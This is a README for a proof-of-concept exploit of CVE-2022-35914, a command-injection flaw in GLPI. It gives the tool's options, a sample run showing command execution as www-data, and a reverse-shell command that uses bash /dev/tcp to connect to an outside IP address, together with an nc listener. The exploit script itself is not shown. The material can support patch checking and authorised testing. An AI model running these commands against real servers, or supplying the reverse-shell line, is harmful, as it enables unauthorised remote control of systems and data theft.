# CVE-2022-35914 PoC

## References

- https://github.com/glpi-project/glpi/security/advisories/GHSA-c5gx-789q-5pcr
- https://github.com/cosad3s/CVE-2022-35914-poc (Credit to Sébastien Copin for the PoC I adapted here)


Check out my full writeup here: https://link.medium.com/tBwDlpQl3Ib 

## Usage

```bash
pip install -r requirements.txt
```

```
python3 CVE-2022-35914.py -h
usage: CVE-2022-35914.py [-h] -u URL [-c CMD] [-f HOOK] [-b CALLBACK] [--check] [--user-agent USER_AGENT]

CVE-2022-35914 - GLPI - Command injection using a third-party library script

options:
  -h, --help            show this help message and exit
  -u URL                URL to test
  -c CMD                Command to launch (default: id)
  -f HOOK               PHP hook function (default: array_map)
  -b CALLBACK           PHP callback function (default: system)
  --check               Just check, no command execution.
  --user-agent USER_AGENT
                        Custom User-Agent
```

Example:
```bash
python3 CVE-2022-35914.py -u http://glpi

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
Revshell:
```bash
python3 CVE-2022-35914.py -u http://192.168.249.242 -c 'bash -c "bash -i >& /dev/tcp/192.168.45.154/80 0>&1"'

nc -lvnp 80
```
